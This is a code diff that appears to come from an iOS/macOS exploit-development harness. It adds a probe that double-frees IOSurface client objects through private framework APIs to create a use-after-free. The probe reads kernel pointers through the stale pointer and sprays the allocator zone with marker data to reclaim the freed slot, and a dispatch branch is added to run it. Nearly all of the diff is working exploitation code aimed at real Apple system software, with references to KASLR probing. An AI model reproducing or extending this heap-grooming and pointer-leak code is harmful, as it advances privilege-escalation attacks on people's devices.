@@ -15901,6 +15901,275 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r368: Zone-aware UAF spray + natural client reuse.
+ * 1) Find the malloc zone of the client ref
+ * 2) Spray into that zone after double-free
+ * 3) Also test natural reuse by creating new IOSurfaces
+ */
+static void r368_probe(void) {
+    rlog("\n=== r368: Zone-Aware UAF + Natural Client Reuse ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+
+    if (!clLookup || !clRelease) { rlog("  FATAL: missing APIs\n"); goto r368_done; }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys368[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals368[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef crprops = CFDictionaryCreate(NULL,
+        (const void**)keys368, (const void**)vals368, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Part 1: Find the malloc zone ---- */
+    rlog("--- Part 1: Identify malloc zone ---\n");
+    IOSurfaceRef surf_probe = IOSurfaceCreate(crprops);
+    uint32_t sid_probe = IOSurfaceGetID(surf_probe);
+    IOSurfaceClientRef cl_probe = clLookup(sid_probe);
+    rlog("  Client ref: %p\n", cl_probe);
+
+    malloc_zone_t *client_zone = malloc_zone_from_ptr(cl_probe);
+    rlog("  Zone: %p", (void*)client_zone);
+    if (client_zone) {
+        rlog(" name='%s'", malloc_get_zone_name(client_zone) ? malloc_get_zone_name(client_zone) : "?");
+    }
+    rlog("\n");
+
+    /* Also check default malloc zone */
+    malloc_zone_t *default_zone = malloc_default_zone();
+    rlog("  Default zone: %p name='%s'\n", (void*)default_zone,
+        malloc_get_zone_name(default_zone) ? malloc_get_zone_name(default_zone) : "?");
+    rlog("  Same zone? %s\n", client_zone == default_zone ? "YES" : "NO");
+
+    /* Check a regular malloc allocation for comparison */
+    void *test_alloc = malloc(448);
+    malloc_zone_t *test_zone = malloc_zone_from_ptr(test_alloc);
+    rlog("  malloc(448) zone: %p name='%s'\n", (void*)test_zone,
+        test_zone && malloc_get_zone_name(test_zone) ? malloc_get_zone_name(test_zone) : "?");
+    free(test_alloc);
+
+    clRelease(cl_probe);
+    CFRelease(surf_probe);
+
+    /* ---- Part 2: Natural client reuse test ---- */
+    rlog("\n--- Part 2: Natural client ref reuse ---\n");
+    fflush(stdout);
+
+    /* Create Surface A and save its address */
+    IOSurfaceRef surf_a = IOSurfaceCreate(crprops);
+    uint32_t sid_a = IOSurfaceGetID(surf_a);
+    IOSurfaceClientRef cl_a = clLookup(sid_a);
+    uint8_t *ba = (uint8_t*)cl_a;
+    uint64_t kptr_a; memcpy(&kptr_a, ba + 88, 8);
+    rlog("  Surface A: ID=%u, client=%p, kptr=0x%llx\n",
+        sid_a, cl_a, (unsigned long long)kptr_a);
+
+    /* Set marker property on A */
+    CFStringRef mk = CFStringCreateWithCString(NULL, "r368_marker", kCFStringEncodingASCII);
+    int marker_val = 0xAAAA;
+    CFNumberRef mkn = CFNumberCreate(NULL, kCFNumberIntType, &marker_val);
+    clSetValue(cl_a, mk, mkn);
+
+    /* Save A's full state */
+    uint8_t saved_a[448];
+    memcpy(saved_a, ba, 448);
+
+    /* Double-free: release + destroy */
+    clRelease(cl_a);
+    CFRelease(surf_a);
+    surf_a = NULL;
+    rlog("  Surface A freed (clRelease + CFRelease)\n");
+
+    /* Now create Surface C — its client might reuse A's slot */
+    IOSurfaceRef surf_c = IOSurfaceCreate(crprops);
+    uint32_t sid_c = IOSurfaceGetID(surf_c);
+    IOSurfaceClientRef cl_c = clLookup(sid_c);
+    rlog("  Surface C: ID=%u, client=%p\n", sid_c, cl_c);
+
+    if (cl_c == cl_a) {
+        rlog("  *** EXACT REUSE: cl_c == old cl_a! ***\n");
+    }
+
+    /* Check what's at the stale pointer now */
+    uint8_t current[448];
+    memcpy(current, ba, 448);
+    int reuse_diffs = 0;
+    for (int off = 0; off < 448; off += 8) {
+        uint64_t vs, vc;
+        memcpy(&vs, saved_a + off, 8);
+        memcpy(&vc, current + off, 8);
+        if (vs != vc) reuse_diffs++;
+    }
+    rlog("  Stale ptr changes: %d/56 qwords\n", reuse_diffs);
+
+    /* Read the new kptr at +88 from stale pointer */
+    uint64_t new_kptr; memcpy(&new_kptr, ba + 88, 8);
+    uint32_t new_sid; memcpy(&new_sid, ba + 136, 4);
+    rlog("  Stale +88 (kptr): 0x%llx (was 0x%llx)\n",
+        (unsigned long long)new_kptr, (unsigned long long)kptr_a);
+    rlog("  Stale +136 (sid): %u (was %u, C=%u)\n", new_sid, sid_a, sid_c);
+
+    if (new_sid == sid_c) {
+        rlog("  *** CLIENT REUSE CONFIRMED: stale ptr now has C's data! ***\n");
+    }
+
+    /* ---- Part 3: Zone-aware spray ---- */
+    rlog("\n--- Part 3: Zone-aware malloc spray ---\n");
+    fflush(stdout);
+
+    /* Create and destroy another surface to free a slot */
+    IOSurfaceRef surf_d = IOSurfaceCreate(crprops);
+    uint32_t sid_d = IOSurfaceGetID(surf_d);
+    IOSurfaceClientRef cl_d = clLookup(sid_d);
+    uint8_t *bd = (uint8_t*)cl_d;
+    uint64_t kptr_d; memcpy(&kptr_d, bd + 88, 8);
+    rlog("  Surface D: ID=%u, client=%p, kptr=0x%llx\n",
+        sid_d, cl_d, (unsigned long long)kptr_d);
+
+    uint8_t saved_d[448];
+    memcpy(saved_d, bd, 448);
+
+    clRelease(cl_d);
+    CFRelease(surf_d);
+    surf_d = NULL;
+    rlog("  Surface D freed\n");
+
+    /* Spray using the zone */
+    if (client_zone) {
+        void *zone_spray[1024];
+        int zone_hit = 0;
+        for (int i = 0; i < 1024; i++) {
+            zone_spray[i] = malloc_zone_malloc(client_zone, 448);
+            if (!zone_spray[i]) continue;
+            memset(zone_spray[i], 0x42, 448);
+            uint32_t spray_sid = sid_c;
+            memcpy((uint8_t*)zone_spray[i] + 136, &spray_sid, 4);
+            uint64_t spray_marker = 0x368368368368ULL;
+            memcpy((uint8_t*)zone_spray[i] + 200, &spray_marker, 8);
+            if (zone_spray[i] == cl_d) {
+                zone_hit = 1;
+                rlog("  *** ZONE HIT: zone_spray[%d] == cl_d (%p) ***\n", i, cl_d);
+            }
+        }
+
+        /* Check stale D pointer */
+        uint8_t post_zone[448];
+        memcpy(post_zone, bd, 448);
+        int zone_diffs = 0;
+        for (int off = 0; off < 448; off += 8) {
+            uint64_t vz;
+            memcpy(&vz, post_zone + off, 8);
+            if (vz == 0x368368368368ULL) {
+                rlog("  Zone spray marker found at +%d!\n", off);
+                zone_diffs = 99;
+                break;
+            }
+        }
+        uint64_t zcheck; memcpy(&zcheck, bd + 200, 8);
+        rlog("  D stale +200: 0x%llx (expect 0x368368368368)\n", (unsigned long long)zcheck);
+        uint32_t zsid; memcpy(&zsid, bd + 136, 4);
+        rlog("  D stale +136: %u (expect %u)\n", zsid, sid_c);
+
+        if (!zone_hit) {
+            rlog("  No direct address match, checking data overlap...\n");
+            int nonzero = 0;
+            for (int off = 0; off < 448; off += 8) {
+                uint64_t v; memcpy(&v, bd + off, 8);
+                if (v == 0x4242424242424242ULL) nonzero++;
+            }
+            rlog("  0x42-filled qwords at D's stale ptr: %d/56\n", nonzero);
+        }
+
+        for (int i = 0; i < 1024; i++) malloc_zone_free(client_zone, zone_spray[i]);
+    }
+
+    /* ---- Part 4: Many-surface batch reuse ---- */
+    rlog("\n--- Part 4: Batch create to test FIFO reuse ---\n");
+    fflush(stdout);
+
+    /* Create 16 surfaces, record addresses */
+    IOSurfaceRef surfs[16] = {0};
+    IOSurfaceClientRef cls[16] = {0};
+    void *cl_addrs[16] = {0};
+    for (int i = 0; i < 16; i++) {
+        surfs[i] = IOSurfaceCreate(crprops);
+        if (!surfs[i]) break;
+        uint32_t sid = IOSurfaceGetID(surfs[i]);
+        cls[i] = clLookup(sid);
+        cl_addrs[i] = cls[i];
+    }
+
+    /* Destroy surface 8 (middle) */
+    uint8_t *target_ptr = (uint8_t*)cls[8];
+    void *target_addr = cls[8];
+    clRelease(cls[8]); cls[8] = NULL;
+    CFRelease(surfs[8]); surfs[8] = NULL;
+    rlog("  Freed surface #8, client was at %p\n", target_addr);
+
+    /* Create a new surface and see if it reuses the slot */
+    IOSurfaceRef surf_new = IOSurfaceCreate(crprops);
+    uint32_t sid_new = IOSurfaceGetID(surf_new);
+    IOSurfaceClientRef cl_new = clLookup(sid_new);
+    rlog("  New surface: ID=%u, client=%p\n", sid_new, cl_new);
+    rlog("  Reuse of #8's slot? %s\n", cl_new == target_addr ? "YES!" : "no");
+
+    /* Check if ANY of the other freed slots matched */
+    for (int i = 0; i < 16; i++) {
+        if (cl_addrs[i] == cl_new && i != 8) {
+            rlog("  Matched surface #%d's old slot instead!\n", i);
+        }
+    }
+
+    /* If reused, the stale pointer to #8 now has new surface's data */
+    if (cl_new == target_addr) {
+        uint64_t reused_kptr; memcpy(&reused_kptr, target_ptr + 88, 8);
+        uint32_t reused_sid; memcpy(&reused_sid, target_ptr + 136, 4);
+        rlog("  Stale ptr kptr: 0x%llx\n", (unsigned long long)reused_kptr);
+        rlog("  Stale ptr sid: %u (new=%u)\n", reused_sid, sid_new);
+    }
+
+    /* Cleanup */
+    clRelease(cl_new);
+    CFRelease(surf_new);
+    for (int i = 0; i < 16; i++) {
+        if (cls[i]) clRelease(cls[i]);
+        if (surfs[i]) CFRelease(surfs[i]);
+    }
+
+    if (cl_c) clRelease(cl_c);
+    if (surf_c) CFRelease(surf_c);
+
+    CFRelease(crprops);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+    CFRelease(mk); CFRelease(mkn);
+r368_done:
+    if (iosurfH) dlclose(iosurfH);
+    rlog("\n=== r368 complete ===\n");
+    fflush(stdout);
+}
+
 /* r367: Double-release UAF — get refcount to 0 for real free.
  * The client ref starts at refcount 2. One release only drops to 1.
  * We need to: (1) release client, (2) destroy IOSurfaceRef (drops last ref).
@@ -55472,6 +55741,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 371) {
+            rlog("*** rounds=371: Zone-Aware UAF + Natural Client Reuse ***\n");
+            rlog("  Identify allocator zone, test zone-spray and natural\n");
+            rlog("  IOSurfaceClientRef reuse after double-free.\n\n");
+            fflush(stdout);
+            r368_probe();
+            goto done;
+        }
         if (rounds == 370) {
             rlog("*** rounds=370: Double-Release UAF + Real Free ***\n");
             rlog("  Release client + destroy surface to reach refcount 0,\n");
@@ -57643,7 +57920,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -67485,7 +67762,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
